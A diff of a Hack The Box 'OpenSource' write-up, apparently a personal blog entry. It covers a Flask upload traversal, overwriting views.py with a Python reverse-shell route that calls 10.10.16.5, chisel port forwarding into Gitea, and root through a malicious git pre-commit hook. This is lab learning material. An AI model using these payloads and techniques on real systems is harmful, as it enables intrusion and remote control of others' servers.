@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/opensource.png
-tags: ["HTB"]
+tags: ["HTB", "upload", "source-code", "git", "git-hooks", "flask", "directory-traversal", "file-read", "flask-debug", "flask-debug-pin",  "chisel", "gitea", "pspy", "werkzeug", "werkzeug-debug"]
 ---
 
 # OpenSource
@@ -278,38 +278,139 @@ file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
 - We can utilize `get_file_name` function in `utils.py`, which replaces `../`
   - So if we send `http://10.10.11.164/uploads/..//etc/passwd`, it could work
 
+![](./images/9.png)
+
+
+- Since app is running in debug mode, it will reload source files whenever there are changes occur
+  - So we can try overwriting `views.py` using `upcloud` route (both `uploads` and `upcloud` use `os.path.join`)
+    - For example adding one more route with web shell or reverse shell
+  - We know the location of the app is in `/app` based on `Dockerfile`
+
+![](./images/10.png)
+
+
+- Modify `views.py`
+  - Add `revshell` route with reverse shell code
+
 ```
-└─$ curl --path-as-is http://10.10.11.164/uploads/..//etc/passwd    
-root:x:0:0:root:/root:/bin/ash
-bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin
-adm:x:3:4:adm:/var/adm:/sbin/nologin
-lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/mail:/sbin/nologin
-news:x:9:13:news:/usr/lib/news:/sbin/nologin
-uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-man:x:13:15:man:/usr/man:/sbin/nologin
-postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
-cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
-ftp:x:21:21::/var/lib/ftp:/sbin/nologin
-sshd:x:22:22:sshd:/dev/null:/sbin/nologin
-at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
-squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
-xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
-games:x:35:35:games:/usr/games:/sbin/nologin
-cyrus:x:85:12::/usr/cyrus:/sbin/nologin
-vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
-ntp:x:123:123:NTP:/var/empty:/sbin/nologin
-smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
-guest:x:405:100:guest:/dev/null:/sbin/nologin
-nobody:x:65534:65534:nobody:/:/sbin/nologin
+...
+@app.route('/revshell')
+def revshell():
+    import socket
+    import os
+    import pty
+    
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.10.16.5",6666))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("sh")
 ```
 
+- Let's start listener and upload malicious source file
+  - We need to intercept the request and change the `filename`
+  - I had weird symbols, but after upgrading the shell they dissappeared
+
+![](./images/11.png)
+
+![](./images/12.png)
 
 ## User
+- Enumerate
+  - We know it's a container
+```
+/ # ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:07  
+          inet addr:172.17.0.7  Bcast:172.17.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:995159 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:994203 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:86315357 (82.3 MiB)  TX bytes:155143921 (147.9 MiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+```
+```
+/ # ip route
+default via 172.17.0.1 dev eth0 
+172.17.0.0/16 dev eth0 scope link  src 172.17.0.7 
+```
+
+- I was stuck here for a while, until I saw a port `3000` in `nmap` results which was filtered
+  - So I tried `wget` that port from container (`curl` is not installed)
+  - It's a `Gitea`
+
+![](./images/13.png)
+
+- Let's upload `chisel` and configure port forwarding
+  - Container: `./chisel client 10.10.16.5:9001 R:3000:172.17.0.1:3000`, forward remote(`R`) port `3000` (attack box) to `172.17.0.1:3000`
+  - Attack box: `./chisel server -p  9001 --reverse`
+  - Now we can check `Gitea` from our attack box
+
+![](./images/14.png)
+
+- Use creds for `dev01` that were found before
+  - We have `home-backup` repo with `.ssh` and keys in it
+  - Let's download them
+
+![](./images/15.png)
+
+![](./images/16.png)
+
+- `ssh` using the key
+  - Don't forget `chmod 600 id_rsa`
+
+![](./images/17.png)
 
 ## Root
+- No `sudo` rights
+  - Creds for `dev01` works
+  - `linpeas` shows `git-sync` script in `/usr/local/bin/`
+  - `pspy` also shows the same script running every minute
+
+![](./images/18.png)
+
+![](./images/19.png)
+
+- The content of the `git-sync`
+```
+dev01@opensource:/tmp$ cat /usr/local/bin/git-sync 
+#!/bin/bash
+
+cd /home/dev01/
+
+if ! git status --porcelain; then
+    echo "No changes"
+else
+    day=$(date +'%Y-%m-%d')
+    echo "Changes detected, pushing.."
+    git add .
+    git commit -m "Backup for ${day}"
+    git push origin main
+fi
+```
+
+- We can utilize [git-hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
+  - So that whenever someone tries to commit `dev01`'s home directory, the custom script will be launched ( because we know that it's being backed up by script above periodically)
+    - According to docs, everything with `.sample` is skipped
+
+![](./images/20.png)
+
+- Let's create a reverse shell script in `hooks` directory 
+  - `...The pre-commit hook is run first, before you even type in a commit message...`, so let's name our script `pre-commit`
+
+![](./images/21.png)
+
+![](./images/22.png)
+
+- Get `root` flag
+
+![](./images/23.png)
